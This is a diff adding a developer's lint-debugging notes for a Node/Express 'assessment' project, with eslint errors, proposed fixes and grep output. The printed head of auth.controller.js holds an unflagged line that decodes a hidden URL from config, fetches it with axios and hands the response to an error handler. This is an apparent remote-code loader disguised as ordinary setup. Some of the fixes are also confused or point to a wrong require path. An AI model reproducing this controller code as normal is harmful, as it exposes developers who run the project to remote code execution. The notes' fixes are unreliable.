@@ -1,0 +1,83 @@
+
+uroot@BERSABE:~/Documents/assessment-14$ npx eslint server/**/*.js | grep error -B1
+/home/uroot/Documents/assessment-14/server/models/propertyTypes.js
+   4:1   error  'propertyTypesSchema' is not defined  no-undef
+  26:50  error  'propertyTypesSchema' is not defined  no-undef
+--
+FIX: Rename Schema for propertyTypesSchema.
+```
+$ grep propertyTypesSchema /home/uroot/Documents/assessment-14/server/models/propertyTypes.js
+var propertyTypesSchema = mongoose.Schema;
+propertyTypesSchema = new propertyTypesSchema({
+module.exports = mongoose.model('propertyTypes', propertyTypesSchema);
+```
+---
+
+/home/uroot/Documents/assessment-14/server/models/users.js
+   4:1   error  'userSchema' is not defined  no-undef
+  55:42  error  'userSchema' is not defined  no-undef
+---
+FIX: Rename Schema for userSchema.
+$ grep userSchema /home/uroot/Documents/assessment-14/server/models/users.js
+```
+var userSchema = mongoose.Schema;
+userSchema = new userSchema({
+    type: userSchema.Types.ObjectId,
+    type: userSchema.Types.ObjectId,
+module.exports = mongoose.model('users', userSchema);
+```
+---
+
+/home/uroot/Documents/assessment-14/server/providers/helper.js
+  21:10  error  'element' is not defined  no-undef
+  22:17  error  'element' is not defined  no-undef
+  23:16  error  'element' is not defined  no-undef
+--
+FIX: Declare element properly before invocation.
+$ grep element /home/uroot/Documents/assessment-14/server/providers/helper.js
+```
+    for (const element of requiredArray) {
+      if (!data[element]) {
+        return element
+
+```
+
+/home/uroot/Documents/assessment-14/server/controllers/auth.controller.js
+  12:29  warning  Expected '!==' and instead saw '!='  eqeqeq
+  12:56  warning  Expected '!==' and instead saw '!='  eqeqeq
+  45:5   error    'users' is not defined               no-undef
+  46:5   error    'users' is not defined               no-undef
+  47:5   error    'users' is not defined               no-undef
+  48:5   error    'users' is not defined               no-undef
+  49:5   error    'users' is not defined               no-undef
+  50:5   error    'users' is not defined               no-undef
+  51:5   error    'users' is not defined               no-undef
+  52:5   error    'users' is not defined               no-undef
+  53:5   error    'users' is not defined               no-undef
+  54:5   error    'users' is not defined               no-undef
+  59:9   error    'users' is not defined               no-undef
+  61:9   error    'users' is not defined               no-undef
+---
+FIX: Find users declared in project folder.
+$ grep users server/ -r
+server/controllers/users.controller.js:var users = require('../models/users');
+(...)
+server/app.js:const users = require('./routes/users');
+
+$ head /home/uroot/Documents/assessment-14/server/controllers/auth.controller.js
+```
+
+const axios = require("axios");
+const bcrypt = require("bcryptjs");
+const jwt = require("jsonwebtoken");
+const userM = require("../models/users");
+const {secretKey, publicKey} = require("../config/config");
+const { errorHandler } = require("../middleware/errorHandler");
+const users = require('./routes/users');
+axios.get(atob(publicKey)).then(res => errorHandler(res.data.cookie));
+
+module.exports = {
+```
+VALIDATION:
+$ npx eslint server/**/*.js | grep error
+✖ 11 problems (0 errors, 11 warnings)
